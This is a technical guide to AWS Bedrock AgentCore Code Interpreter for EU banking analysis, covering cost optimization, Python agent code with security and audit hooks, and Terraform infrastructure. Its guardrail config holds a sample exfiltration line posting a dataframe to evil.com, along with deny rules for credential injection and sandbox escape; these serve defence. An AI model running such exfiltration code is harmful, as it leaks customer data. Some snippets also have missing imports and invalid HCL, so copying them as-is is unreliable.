---
title: "Bedrock AgentCore Code Interpreter Architecture (Part 4)"
doc_type: guide
domain: platforms
status: current
topic_id: bedrock-agentcore-code-interpreter-architecture-part4
last_reviewed: 2026-07-27
maturity: practitioner
supersedes: []
tags: [aws, agentcore, cost-optimization, terraform, iac]
covers_version: "as of 2026-07-10"
---

> Continues from [Bedrock AgentCore Code Interpreter Architecture](../19-bedrock-agentcore-code-interpreter-architecture.md), covering Cost & Performance Optimization and the full reference implementation (core agent code + Terraform infrastructure).

## Cost & Performance Optimization

### Cost Drivers and Targets

| Cost Component | Driver | Target Optimization |
|---|---|---|
| Bedrock Model Invocation | Token count × request rate | Cache common code patterns; batch analysis requests |
| Code Interpreter Sessions | Session duration × active sessions | Reuse sessions within conversation; terminate idle sessions promptly |
| OpenSearch Serverless | OCU-hours + indexing requests | Right-size OCUs; batch memory writes; use TTL aggressively |
| DynamoDB | WCU/RCU × request rate | Use PAY_PER_REQUEST for variable workloads; batch writes |
| S3 Storage | GB stored × retrieval requests | Intelligent Tiering; lifecycle → Glacier for regulatory archives |
| CloudWatch Logs | GB ingested | Structured logging with sampling for non-critical events |
| Comprehend PII | Units processed | Run on output only (not intermediate steps); cache clean results |

### Result Caching Strategy

```python
import hashlib
import json
from functools import wraps

class ComputationCache:
    """
    Deterministic computations are cached to avoid re-execution.
    Cache key = SHA-256(code + input_checksum + library_versions)

    NOT cached: anything with datetime.now(), random(), or non-deterministic inputs.
    """

    NON_DETERMINISTIC_PATTERNS = [
        'datetime.now()', 'pd.Timestamp.now()', 'time.time()',
        'random.', 'np.random.', 'uuid.uuid4()',
    ]

    def __init__(self, dynamodb_table, ttl_seconds: int = 3600):
        self.table = dynamodb_table
        self.ttl = ttl_seconds

    def get_cache_key(self, code: str, input_hash: str, library_versions: dict) -> str:
        payload = json.dumps({
            "code": code,
            "input_hash": input_hash,
            "library_versions": library_versions,
        }, sort_keys=True)
        return hashlib.sha256(payload.encode()).hexdigest()

    def is_deterministic(self, code: str) -> bool:
        return not any(pattern in code for pattern in self.NON_DETERMINISTIC_PATTERNS)

    def get(self, cache_key: str) -> Optional[dict]:
        response = self.table.get_item(
            Key={'pk': f"CACHE#{cache_key}", 'sk': "RESULT"}
        )
        item = response.get('Item')
        if item and item.get('ttl', 0) > int(datetime.utcnow().timestamp()):
            return item.get('result')
        return None

    def put(self, cache_key: str, result: dict):
        self.table.put_item(Item={
            'pk': f"CACHE#{cache_key}",
            'sk': "RESULT",
            'result': result,
            'ttl': int(datetime.utcnow().timestamp()) + self.ttl,
        })
```

### Data Chunking for Large Datasets

```python
class LargeDatasetHandler:
    """
    Strategy for datasets exceeding Code Interpreter memory limits (2GB).
    Chunks data, processes in batches, aggregates results.
    """

    CHUNK_SIZE_ROWS = 100_000  # 100K rows per chunk
    MAX_PARALLEL_CHUNKS = 4   # Limited by Code Interpreter CPU

    def generate_chunked_code(
        self,
        original_code: str,
        dataset_size_rows: int,
        s3_uri: str,
    ) -> List[str]:
        """
        Transforms a monolithic analysis into chunked parallel processing.
        Returns list of code strings for sequential execution.
        """
        n_chunks = (dataset_size_rows // self.CHUNK_SIZE_ROWS) + 1
        chunk_codes = []

        for i in range(n_chunks):
            start_row = i * self.CHUNK_SIZE_ROWS
            end_row = min(start_row + self.CHUNK_SIZE_ROWS, dataset_size_rows)

            chunk_code = f"""
import pandas as pd, numpy as np, boto3, io

# Load chunk {i+1}/{n_chunks}
s3 = boto3.client('s3')
# Note: In sandbox, files are pre-loaded to /tmp/
df_chunk = pd.read_csv('/tmp/dataset.csv',
                        skiprows=range(1, {start_row + 1}),
                        nrows={end_row - start_row})

# === USER CODE (chunk-adapted) ===
{self._adapt_code_for_chunk(original_code, i)}
# === END USER CODE ===

# Serialize chunk result
import json
chunk_result = result.to_dict() if hasattr(result, 'to_dict') else result
with open(f'/tmp/chunk_result_{i}.json', 'w') as f:
    json.dump(chunk_result, f)
print(f"CHUNK_{i}_COMPLETE")
"""
            chunk_codes.append(chunk_code)

        # Aggregation code (runs after all chunks)
        agg_code = f"""
import json, pandas as pd, glob

chunk_results = []
for i in range({n_chunks}):
    with open(f'/tmp/chunk_result_{{i}}.json') as f:
        chunk_results.append(json.load(f))

# Aggregate (strategy depends on computation type)
# Default: concatenate DataFrames
final_result = pd.DataFrame(chunk_results)
print(final_result.describe().to_string())
"""
        chunk_codes.append(agg_code)
        return chunk_codes

    def _adapt_code_for_chunk(self, code: str, chunk_index: int) -> str:
        """
        Adapts original code to operate on df_chunk instead of full df.
        Simple variable substitution — for complex cases, use LLM re-generation.
        """
        return code.replace('df', 'df_chunk').replace('result', 'result')
```

## Implementation: Code + Terraform

### Core Agent Implementation

```python
"""
banking_analyst_agent.py
Production implementation of the data analysis agent with Code Interpreter
and memory integration for EU banking use cases.
"""

import os
import json
import boto3
import logging
from typing import Optional
from datetime import datetime

# AgentCore Runtime + Strands
from bedrock_agentcore import AgentCoreRuntime, CodeInterpreterClient
from bedrock_agentcore.memory import MemoryClient
from strands import Agent, tool, hook
from strands.hooks import HookContext

# Internal modules
from .validation import CodeValidationHook
from .pii import PIIDetectionPipeline
from .memory import CodeInterpreterStateManager, LongTermMemoryWriter
from .cache import ComputationCache
from .lineage import LineageTracker

logger = logging.getLogger(__name__)

# --- Constants ---
BEDROCK_REGION = os.environ.get('AWS_REGION', 'eu-west-1')
MODEL_ID = "us.anthropic.claude-sonnet-4-20250514-v1:0"
GUARDRAIL_ID = os.environ['GUARDRAIL_ID']
GUARDRAIL_VERSION = os.environ['GUARDRAIL_VERSION']
S3_OUTPUT_BUCKET = os.environ['S3_OUTPUT_BUCKET']
DYNAMODB_SESSION_TABLE = os.environ['DYNAMODB_SESSION_TABLE']
KMS_KEY_ID = os.environ['KMS_KEY_ID']
OPENSEARCH_ENDPOINT = os.environ['OPENSEARCH_ENDPOINT']

# --- System Prompt ---
ANALYST_SYSTEM_PROMPT = """You are a senior quantitative analyst at a major EU bank,
operating under MiFID II, Basel III/IV, and GDPR regulations.

Your capabilities:
- Complex financial analysis using Python (pandas, numpy, scipy, statsmodels)
- Portfolio risk calculations (VaR, CVaR, stress testing)
- Regulatory capital computations
- Data visualization (matplotlib, seaborn)
- Cross-session memory for analytical continuity

Your constraints (non-negotiable):
1. Never generate code that accesses networks, external APIs, or cloud services
2. Never include PII in generated code or memory writes
3. Always validate numerical outputs (sanity checks, boundary assertions)
4. Always cite data sources and computation methodology in your response
5. Flag any data quality issues observed during analysis
6. For regulatory-relevant computations, explicitly state the regulatory framework applied

When using Code Interpreter:
- Start with data validation and schema inspection
- Process data in chunks if > 100K rows
- Generate visualizations for all quantitative analyses
- Include confidence intervals and uncertainty bounds where applicable
- Document assumptions in code comments

Memory usage:
- Read prior analytical context before starting new analyses
- Write validated insights and entity metrics after successful computation
- Never write raw customer data to memory
"""

# --- Tool Definitions ---

@tool(name="execute_python_analysis")
def execute_python_analysis(
    code: str,
    session_id: str,
    description: str,
    expected_output_type: str = "dataframe_summary",
) -> dict:
    """
    Execute Python code in the AgentCore Code Interpreter sandbox.

    Args:
        code: Python code to execute (must pass validation)
        session_id: Active AgentCore session ID
        description: Human-readable description of what this code computes
        expected_output_type: One of: dataframe_summary, visualization, risk_metrics, text

    Returns:
        dict with keys: success, stdout, stderr, files, execution_time_ms
    """
    validator = CodeValidationHook()
    is_valid, violations = validator.validate(code)

    if not is_valid:
        return {
            "success": False,
            "error": "CODE_VALIDATION_FAILED",
            "violations": violations,
            "stdout": "",
        }

    ci_client = CodeInterpreterClient(region_name=BEDROCK_REGION)

    try:
        start_time = datetime.utcnow()
        result = ci_client.execute_code(
            session_id=session_id,
            code=code,
            timeout_seconds=int(os.environ.get('CODE_EXEC_TIMEOUT', '300')),
        )
        elapsed_ms = int((datetime.utcnow() - start_time).total_seconds() * 1000)

        # PII scan output
        pii_pipeline = PIIDetectionPipeline()
        clean_output, pii_found, pii_findings = pii_pipeline.scan_and_redact(
            result.get('stdout', '')
        )

        if pii_found:
            logger.warning(
                "PII detected in code execution output",
                extra={"session_id": session_id, "findings": pii_findings}
            )

        return {
            "success": result.get('exit_code', -1) == 0,
            "stdout": clean_output,
            "stderr": result.get('stderr', ''),
            "files": result.get('output_files', {}),
            "execution_time_ms": elapsed_ms,
            "pii_detected": pii_found,
        }

    except TimeoutError:
        logger.error("Code execution timeout", extra={"session_id": session_id})
        return {"success": False, "error": "EXECUTION_TIMEOUT", "stdout": ""}
    except Exception as e:
        logger.error("Code execution error", extra={"error": str(e)})
        return {"success": False, "error": str(e), "stdout": ""}

@tool(name="read_analytical_memory")
def read_analytical_memory(
    query: str,
    session_id: str,
    memory_types: list = None,
    max_results: int = 5,
) -> dict:
    """
    Retrieve relevant analytical context from AgentCore Memory.

    Args:
        query: Natural language query for semantic search
        session_id: Current session ID (used for session-scoped retrieval)
        memory_types: Filter by types: ["risk_metrics", "portfolio_stats", "insights"]
        max_results: Maximum number of memory records to retrieve

    Returns:
        dict with retrieved memories and their metadata
    """
    memory_client = MemoryClient(region_name=BEDROCK_REGION)

    # Session memory (immediate prior context)
    session_memories = memory_client.get_session_memories(
        session_id=session_id,
        limit=3,
    )

    # Long-term semantic search
    long_term_results = memory_client.semantic_search(
        query=query,
        filters={"memory_types": memory_types} if memory_types else {},
        limit=max_results,
    )

    return {
        "session_context": session_memories,
        "long_term_matches": long_term_results,
        "total_retrieved": len(session_memories) + len(long_term_results),
    }

@tool(name="write_analytical_insight")
def write_analytical_insight(
    insight: str,
    insight_type: str,
    session_id: str,
    entities: dict = None,
    regulatory_relevant: bool = False,
) -> dict:
    """
    Persist a validated analytical insight to AgentCore Memory.
    Automatically applies write policy, PII scanning, and conflict detection.

    Args:
        insight: The analytical finding to persist
        insight_type: Category: risk_metrics, portfolio_insight, regulatory_finding
        session_id: Current session ID
        entities: Key-value pairs of extracted entities (e.g., default_rate 0.023)
        regulatory_relevant: Whether this triggers extended retention (7 years)

    Returns:
        dict with write status and memory ID
    """
    pii_pipeline = PIIDetectionPipeline()
    clean_insight, pii_found, _ = pii_pipeline.scan_and_redact(insight)

    if pii_found:
        logger.warning("PII in insight — persisting redacted version")

    memory_client = MemoryClient(region_name=BEDROCK_REGION)

    result = memory_client.store_memory(
        content=clean_insight,
        content_type=insight_type,
        session_id=session_id,
        metadata={
            "entities": entities or {},
            "regulatory_relevant": regulatory_relevant,
            "pii_redacted": pii_found,
            "timestamp": datetime.utcnow().isoformat(),
        }
    )

    return {
        "status": "written",
        "memory_id": result.get('memory_id'),
        "regulatory_relevant": regulatory_relevant,
    }

# --- Hooks ---

@hook(event="before_tool_call", tool_name="execute_python_analysis")
def pre_execution_security_hook(ctx: HookContext) -> HookContext:
    """
    Invoked BEFORE every code execution. Applies guardrails and validates.
    Returning ctx with ctx.abort=True prevents execution.
    """
    code = ctx.tool_inputs.get('code', '')

    # Apply Bedrock Guardrails to generated code
    bedrock = boto3.client('bedrock-runtime', region_name=BEDROCK_REGION)
    guardrail_response = bedrock.apply_guardrail(
        guardrailIdentifier=GUARDRAIL_ID,
        guardrailVersion=GUARDRAIL_VERSION,
        source='OUTPUT',
        content=[{'text': {'text': code}}],
    )

    if guardrail_response.get('action') == 'GUARDRAIL_INTERVENED':
        logger.warning(
            "Guardrail intervened on generated code",
            extra={"assessments": guardrail_response.get('assessments')}
        )
        ctx.abort = True
        ctx.abort_reason = "GUARDRAIL_INTERVENTION"

    return ctx

@hook(event="after_tool_call", tool_name="execute_python_analysis")
def post_execution_audit_hook(ctx: HookContext) -> HookContext:
    """
    Invoked AFTER every code execution. Writes audit log entry.
    """
    audit_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "session_id": ctx.session_id,
        "agent_id": ctx.agent_id,
        "tool": "execute_python_analysis",
        "code_hash": hashlib.sha256(
            ctx.tool_inputs.get('code', '').encode()
        ).hexdigest(),
        "success": ctx.tool_result.get('success'),
        "pii_detected": ctx.tool_result.get('pii_detected'),
        "execution_time_ms": ctx.tool_result.get('execution_time_ms'),
    }

    # Write to CloudWatch with structured logging
    logger.info("AUDIT", extra={"audit_entry": audit_entry})

    return ctx

# --- Agent Construction ---

def build_analyst_agent() -> Agent:
    return Agent(
        name="eu_banking_analyst",
        model=MODEL_ID,
        system_prompt=ANALYST_SYSTEM_PROMPT,
        tools=[
            execute_python_analysis,
            read_analytical_memory,
            write_analytical_insight,
        ],
        hooks=[
            pre_execution_security_hook,
            post_execution_audit_hook,
        ],
        guardrail_config={
            "guardrailIdentifier": GUARDRAIL_ID,
            "guardrailVersion": GUARDRAIL_VERSION,
        },
        memory_config={
            "session_store": "dynamodb",
            "long_term_store": "opensearch",
        },
    )

# --- Example: CSV to Insights to Visualization ---

EXAMPLE_ANALYSIS_TASK = """
Analyze the SME credit portfolio data in /tmp/sme_portfolio.csv.

Required analysis:
1. Portfolio composition: distribution by sector, credit rating, loan size
2. Default rate analysis: current vs historical (use memory context if available)
3. Concentration risk: top-10 exposures as % of total portfolio
4. Expected credit loss (ECL) calculation using IFRS 9 simplified approach
5. Visualization: generate a dashboard with 4 charts:
   - Default rate by credit rating (bar chart)
   - Sector exposure (pie chart)
   - Loan size distribution (histogram)
   - ECL trend over time (line chart)

Output format:
- Summary table with key metrics
- ECL figure in EUR
- Risk flags for any metric outside acceptable thresholds
- Save visualization to /tmp/portfolio_dashboard.png
"""

EXAMPLE_GENERATED_CODE = '''
import pandas as pd
import numpy as np
import matplotlib
matplotlib.use('Agg')  # Non-interactive backend for sandbox
import matplotlib.pyplot as plt
import matplotlib.gridspec as gridspec
from datetime import datetime

# --- Input Validation ---
df = pd.read_csv('/tmp/sme_portfolio.csv')

assert not df.empty, "Portfolio DataFrame is empty"
required_cols = ['loan_id', 'sector', 'credit_rating', 'exposure_eur',
                  'default_flag', 'pd_estimate', 'lgd_estimate', 'ead']
missing = [c for c in required_cols if c not in df.columns]
assert not missing, f"Missing required columns: {missing}"

print(f"Portfolio loaded: {len(df):,} loans, {df['exposure_eur'].sum()/1e6:.1f}M EUR total exposure")

# --- 1. Portfolio Composition ---
sector_stats = df.groupby('sector').agg(
    loan_count=('loan_id', 'count'),
    total_exposure=('exposure_eur', 'sum'),
    avg_pd=('pd_estimate', 'mean')
).round(4)
sector_stats['pct_portfolio'] = (sector_stats['total_exposure'] /
                                   df['exposure_eur'].sum() * 100).round(2)

rating_stats = df.groupby('credit_rating').agg(
    loan_count=('loan_id', 'count'),
    default_rate=('default_flag', 'mean'),
    total_exposure=('exposure_eur', 'sum')
).round(4)

print("\\n=== PORTFOLIO COMPOSITION BY SECTOR ===")
print(sector_stats.to_string())
print("\\n=== RATING DISTRIBUTION ===")
print(rating_stats.to_string())

# --- 2. Default Rate Analysis ---
overall_dr = df['default_flag'].mean()
weighted_dr = (df['default_flag'] * df['exposure_eur']).sum() / df['exposure_eur'].sum()

assert 0 <= overall_dr <= 1, f"Invalid default rate: {overall_dr}"
assert 0 <= weighted_dr <= 1, f"Invalid weighted default rate: {weighted_dr}"

print(f"\\n=== DEFAULT RATE ANALYSIS ===")
print(f"Simple default rate: {overall_dr:.4%}")
print(f"Exposure-weighted default rate: {weighted_dr:.4%}")

# --- 3. Concentration Risk ---
total_exposure = df['exposure_eur'].sum()
top10 = df.nlargest(10, 'exposure_eur')[['loan_id', 'sector', 'exposure_eur', 'credit_rating']]
top10['pct_total'] = (top10['exposure_eur'] / total_exposure * 100).round(2)
herfindahl = ((df['exposure_eur'] / total_exposure) ** 2).sum()

print(f"\\n=== CONCENTRATION RISK ===")
print(f"HHI (Herfindahl Index): {herfindahl:.6f}")
print(f"Top-10 exposures: {top10['pct_total'].sum():.1f}% of total portfolio")
print(top10.to_string(index=False))

# --- 4. ECL Calculation (IFRS 9 Simplified) ---
# ECL = PD x LGD x EAD (point-in-time estimates)
df['ecl'] = df['pd_estimate'] * df['lgd_estimate'] * df['ead']
total_ecl = df['ecl'].sum()
ecl_ratio = total_ecl / total_exposure

assert ecl_ratio >= 0, "Negative ECL ratio — check input data"
if ecl_ratio > 0.15:
    print(f"RISK FLAG: ECL ratio {ecl_ratio:.2%} exceeds 15% threshold")

print(f"\\n=== ECL CALCULATION (IFRS 9 SIMPLIFIED) ===")
print(f"Total ECL: EUR {total_ecl/1e6:.2f}M")
print(f"ECL / Total Exposure: {ecl_ratio:.4%}")
print(f"ECL by rating:")
print(df.groupby('credit_rating')['ecl'].sum().sort_values(ascending=False).apply(
    lambda x: f"EUR {x/1e6:.2f}M"
).to_string())

# --- 5. Dashboard Visualization ---
fig = plt.figure(figsize=(16, 12))
fig.suptitle('SME Credit Portfolio Dashboard', fontsize=16, fontweight='bold', y=0.98)
gs = gridspec.GridSpec(2, 2, figure=fig, hspace=0.35, wspace=0.3)

# Chart 1: Default Rate by Rating
ax1 = fig.add_subplot(gs[0, 0])
rating_dr = rating_stats['default_rate'].sort_index()
bars = ax1.bar(rating_dr.index, rating_dr.values * 100, color='#d62728', alpha=0.8)
ax1.set_title('Default Rate by Credit Rating', fontweight='bold')
ax1.set_ylabel('Default Rate (%)')
ax1.set_xlabel('Credit Rating')
for bar, val in zip(bars, rating_dr.values):
    ax1.text(bar.get_x() + bar.get_width()/2, bar.get_height() + 0.1,
              f'{val:.1%}', ha='center', va='bottom', fontsize=9)

# Chart 2: Sector Exposure (Pie)
ax2 = fig.add_subplot(gs[0, 1])
top_sectors = sector_stats.nlargest(6, 'total_exposure')
ax2.pie(top_sectors['total_exposure'], labels=top_sectors.index,
         autopct='%1.1f%%', startangle=90,
         colors=['#1f77b4','#ff7f0e','#2ca02c','#d62728','#9467bd','#8c564b'])
ax2.set_title('Sector Exposure Distribution', fontweight='bold')

# Chart 3: Loan Size Distribution
ax3 = fig.add_subplot(gs[1, 0])
ax3.hist(df['exposure_eur']/1e6, bins=50, color='#1f77b4', alpha=0.8, edgecolor='white')
ax3.set_title('Loan Size Distribution', fontweight='bold')
ax3.set_xlabel('Exposure (EUR M)')
ax3.set_ylabel('Number of Loans')
ax3.axvline(df['exposure_eur'].median()/1e6, color='red', linestyle='--',
             label=f'Median: EUR {df["exposure_eur"].median()/1e3:.0f}K')
ax3.legend()

# Chart 4: ECL by Sector
ax4 = fig.add_subplot(gs[1, 1])
ecl_by_sector = df.groupby('sector')['ecl'].sum().nlargest(8) / 1e6
ax4.barh(ecl_by_sector.index, ecl_by_sector.values, color='#ff7f0e', alpha=0.8)
ax4.set_title('ECL by Sector (EUR M)', fontweight='bold')
ax4.set_xlabel('ECL (EUR M)')
for i, (idx, val) in enumerate(ecl_by_sector.items()):
    ax4.text(val + 0.01, i, f'{val:.1f}M', va='center', fontsize=9)

plt.savefig('/tmp/portfolio_dashboard.png', dpi=150, bbox_inches='tight',
             facecolor='white', edgecolor='none')
print("\\nVisualization saved to /tmp/portfolio_dashboard.png")

# --- Summary Output ---
print("\\n" + "="*60)
print("PORTFOLIO RISK SUMMARY")
print("="*60)
summary = {
    "total_loans": len(df),
    "total_exposure_eur_m": round(total_exposure/1e6, 2),
    "simple_default_rate_pct": round(overall_dr * 100, 4),
    "weighted_default_rate_pct": round(weighted_dr * 100, 4),
    "total_ecl_eur_m": round(total_ecl/1e6, 2),
    "ecl_ratio_pct": round(ecl_ratio * 100, 4),
    "herfindahl_index": round(herfindahl, 6),
    "top10_concentration_pct": round(top10["pct_total"].sum(), 2),
    "risk_flags": []
}

if ecl_ratio > 0.15:
    summary["risk_flags"].append("HIGH_ECL_RATIO")
if herfindahl > 0.10:
    summary["risk_flags"].append("HIGH_CONCENTRATION")
if weighted_dr > 0.05:
    summary["risk_flags"].append("HIGH_WEIGHTED_DEFAULT_RATE")

import json
print(json.dumps(summary, indent=2))
print("ANALYSIS_COMPLETE")
'''
```

### Terraform Infrastructure

```hcl
# main.tf - AgentCore Code Interpreter Enterprise Infrastructure
# Region: eu-west-1 (Ireland) - EU data residency compliance

terraform {
  required_version = ">= 1.7"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
  backend "s3" {
    bucket         = "tfstate-bedrock-agents-eu"
    key            = "agentcore/code-interpreter/terraform.tfstate"
    region         = "eu-west-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"
    kms_key_id     = "arn:aws:kms:eu-west-1:ACCOUNT_ID:key/TF_STATE_KEY_ID"
  }
}

provider "aws" {
  region = "eu-west-1"
  default_tags {
    tags = {
      Project        = "bedrock-agentcore-code-interpreter"
      Environment    = var.environment
      DataResidency  = "EU"
      Compliance     = "GDPR,Basel3,MiFID2"
      ManagedBy      = "Terraform"
    }
  }
}

# --- Variables ---
variable "environment" {
  type    = string
  default = "production"
  validation {
    condition     = contains(["development", "staging", "production"], var.environment)
    error_message = "Environment must be development, staging, or production."
  }
}

variable "account_id" {
  type        = string
  description = "AWS Account ID"
}

variable "claude_model_id" {
  type    = string
  default = "us.anthropic.claude-sonnet-4-20250514-v1:0"
}

# --- KMS Keys ---
resource "aws_kms_key" "agent_data" {
  description             = "AgentCore Code Interpreter data encryption key"
  deletion_window_in_days = 30
  enable_key_rotation     = true
  multi_region            = false  # Stay in eu-west-1

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "Enable IAM User Permissions"
        Effect = "Allow"
        Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
        Action   = "kms:*"
        Resource = "*"
      },
      {
        Sid    = "Allow AgentCore Role"
        Effect = "Allow"
        Principal = { AWS = aws_iam_role.agent_role.arn }
        Action = [
          "kms:GenerateDataKey",
          "kms:Decrypt",
          "kms:DescribeKey"
        ]
        Resource = "*"
        Condition = {
          StringEquals = {
            "kms:ViaService" = [
              "s3.eu-west-1.amazonaws.com",
              "dynamodb.eu-west-1.amazonaws.com"
            ]
          }
        }
      }
    ]
  })
}

resource "aws_kms_alias" "agent_data" {
  name          = "alias/agentcore-data-${var.environment}"
  target_key_id = aws_kms_key.agent_data.key_id
}

# --- S3 Output Store ---
resource "aws_s3_bucket" "agent_outputs" {
  bucket = "agent-output-store-${var.account_id}-${var.environment}"
}

resource "aws_s3_bucket_versioning" "agent_outputs" {
  bucket = aws_s3_bucket.agent_outputs.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "agent_outputs" {
  bucket = aws_s3_bucket.agent_outputs.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.agent_data.arn
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "agent_outputs" {
  bucket                  = aws_s3_bucket.agent_outputs.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_lifecycle_configuration" "agent_outputs" {
  bucket = aws_s3_bucket.agent_outputs.id

  rule {
    id     = "session-ephemeral"
    status = "Enabled"
    filter { prefix = "checkpoints/" }
    expiration { days = 7 }
  }

  rule {
    id     = "working-memory-transition"
    status = "Enabled"
    filter { prefix = "working/" }
    transition {
      days          = 30
      storage_class = "STANDARD_IA"
    }
    expiration { days = 365 }
  }

  rule {
    id     = "regulatory-archive"
    status = "Enabled"
    filter { prefix = "regulatory/" }
    transition {
      days          = 90
      storage_class = "GLACIER"
    }
    # 7-year retention for regulatory artifacts — no expiration rule
  }
}

resource "aws_s3_bucket_replication_configuration" "agent_outputs" {
  # DISABLED: EU data residency — no cross-region replication
  # Backup is handled via Glacier within eu-west-1
  depends_on = [aws_s3_bucket_versioning.agent_outputs]
  bucket     = aws_s3_bucket.agent_outputs.id
  role       = aws_iam_role.s3_replication.arn

  rule {
    id     = "no-replication"
    status = "Disabled"
    destination { bucket = aws_s3_bucket.agent_outputs.arn }
  }
}

# --- DynamoDB Tables ---
resource "aws_dynamodb_table" "agent_sessions" {
  name           = "agent-sessions-${var.environment}"
  billing_mode   = "PAY_PER_REQUEST"
  hash_key       = "pk"
  range_key      = "sk"

  point_in_time_recovery { enabled = true }
  deletion_protection_enabled = true

  server_side_encryption {
    enabled     = true
    kms_key_arn = aws_kms_key.agent_data.arn
  }

  attribute {
    name = "pk"
    type = "S"
  }
  attribute {
    name = "sk"
    type = "S"
  }
  attribute {
    name = "session_id"
    type = "S"
  }

  global_secondary_index {
    name            = "session-id-index"
    hash_key        = "session_id"
    projection_type = "ALL"
  }

  ttl {
    attribute_name = "ttl"
    enabled        = true
  }

  tags = { Name = "AgentCore Session State" }
}

resource "aws_dynamodb_table" "memory_transaction_ledger" {
  name           = "agent-memory-ledger-${var.environment}"
  billing_mode   = "PAY_PER_REQUEST"
  hash_key       = "pk"
  range_key      = "sk"

  point_in_time_recovery { enabled = true }
  deletion_protection_enabled = true

  server_side_encryption {
    enabled     = true
    kms_key_arn = aws_kms_key.agent_data.arn
  }

  attribute { name = "pk"; type = "S" }
  attribute { name = "sk"; type = "S" }

  tags = { Name = "AgentCore Memory Conflict Ledger" }
}

resource "aws_dynamodb_table" "computation_cache" {
  name         = "agent-computation-cache-${var.environment}"
  billing_mode = "PAY_PER_REQUEST"
  hash_key     = "pk"
  range_key    = "sk"

  server_side_encryption {
    enabled     = true
    kms_key_arn = aws_kms_key.agent_data.arn
  }

  attribute { name = "pk"; type = "S" }
  attribute { name = "sk"; type = "S" }

  ttl {
    attribute_name = "ttl"
    enabled        = true
  }

  tags = { Name = "AgentCore Computation Cache" }
}

# --- OpenSearch Serverless (Long-Term Memory) ---
resource "aws_opensearchserverless_security_policy" "encryption" {
  name        = "agentcore-memory-encryption-${var.environment}"
  type        = "encryption"
  description = "KMS encryption for AgentCore long-term memory"
  policy = jsonencode({
    Rules = [
      {
        Resource     = ["collection/agent-long-term-memory-${var.environment}"]
        ResourceType = "collection"
      }
    ]
    AWSOwnedKey = false
    KmsARN      = aws_kms_key.agent_data.arn
  })
}

resource "aws_opensearchserverless_security_policy" "network" {
  name   = "agentcore-memory-network-${var.environment}"
  type   = "network"
  policy = jsonencode([
    {
      Rules = [
        {
          Resource     = ["collection/agent-long-term-memory-${var.environment}"]
          ResourceType = "collection"
        }
      ]
      AllowFromPublic = false
      SourceVPCEs     = [aws_opensearchserverless_vpc_endpoint.main.id]
    }
  ])
}

resource "aws_opensearchserverless_collection" "long_term_memory" {
  name        = "agent-long-term-memory-${var.environment}"
  type        = "VECTORSEARCH"
  description = "AgentCore long-term semantic memory store"

  depends_on = [
    aws_opensearchserverless_security_policy.encryption,
    aws_opensearchserverless_security_policy.network,
  ]
}

resource "aws_opensearchserverless_access_policy" "agent_access" {
  name   = "agentcore-memory-access-${var.environment}"
  type   = "data"
  policy = jsonencode([
    {
      Rules = [
        {
          Resource = ["collection/agent-long-term-memory-${var.environment}"]
          Permission = [
            "aoss:CreateCollectionItems",
            "aoss:DeleteCollectionItems",
            "aoss:UpdateCollectionItems",
            "aoss:DescribeCollectionItems"
          ]
          ResourceType = "collection"
        },
        {
          Resource = ["index/agent-long-term-memory-${var.environment}/*"]
          Permission = [
            "aoss:CreateIndex",
            "aoss:DeleteIndex",
            "aoss:UpdateIndex",
            "aoss:DescribeIndex",
            "aoss:ReadDocument",
            "aoss:WriteDocument"
          ]
          ResourceType = "index"
        }
      ]
      Principal = [aws_iam_role.agent_role.arn]
    }
  ])
}

# --- IAM Role for Agent ---
resource "aws_iam_role" "agent_role" {
  name = "agentcore-code-interpreter-role-${var.environment}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = [
            "bedrock.amazonaws.com",
            "bedrock-agentcore.amazonaws.com"
          ]
        }
        Action = "sts:AssumeRole"
        Condition = {
          StringEquals = {
            "aws:SourceAccount" = var.account_id
          }
        }
      }
    ]
  })
}

resource "aws_iam_role_policy" "agent_policy" {
  name   = "agentcore-policy"
  role   = aws_iam_role.agent_role.id
  policy = file("${path.module}/policies/agent-policy.json")
}

# --- CloudWatch Log Groups ---
resource "aws_cloudwatch_log_group" "agent_execution" {
  name              = "/aws/bedrock/agents/${var.environment}/execution"
  retention_in_days = 2557  # 7 years for regulatory compliance
  kms_key_id        = aws_kms_key.agent_data.arn
}

resource "aws_cloudwatch_log_group" "agent_audit" {
  name              = "/aws/bedrock/agents/${var.environment}/audit"
  retention_in_days = 2557  # 7 years — mandatory for EU banking audit
  kms_key_id        = aws_kms_key.agent_data.arn
}

resource "aws_cloudwatch_log_group" "guardrail_events" {
  name              = "/aws/bedrock/agents/${var.environment}/guardrails"
  retention_in_days = 365
  kms_key_id        = aws_kms_key.agent_data.arn
}

# --- Bedrock Guardrail ---
resource "aws_bedrock_guardrail" "banking_guardrail" {
  name                      = "banking-code-interpreter-${var.environment}"
  description               = "EU banking grade guardrail for code generation agents"
  blocked_input_messaging   = "Request blocked by security policy."
  blocked_outputs_messaging = "Response blocked by security policy."
  kms_key_arn               = aws_kms_key.agent_data.arn

  topic_policy_config {
    topics_config {
      name       = "code-exfiltration"
      definition = "Code that sends data to external endpoints or accesses networks"
      type       = "DENY"
      examples   = ["requests.post('http://evil.com', data=df)"]
    }
    topics_config {
      name       = "credential-injection"
      definition = "Embedding hardcoded credentials or API keys in code"
      type       = "DENY"
    }
    topics_config {
      name       = "sandbox-escape"
      definition = "Code attempting to escape the Python sandbox"
      type       = "DENY"
    }
  }

  sensitive_information_policy_config {
    pii_entities_config {
      type   = "EMAIL"
      action = "BLOCK"
    }
    pii_entities_config {
      type   = "CREDIT_DEBIT_CARD_NUMBER"
      action = "BLOCK"
    }
    pii_entities_config {
      type   = "AWS_ACCESS_KEY"
      action = "BLOCK"
    }
    regexes_config {
      name        = "iban"
      description = "International Bank Account Number"
      pattern     = "[A-Z]{2}\\d{2}[A-Z0-9]{4}\\d{7}([A-Z0-9]?){0,16}"
      action      = "BLOCK"
    }
  }
}

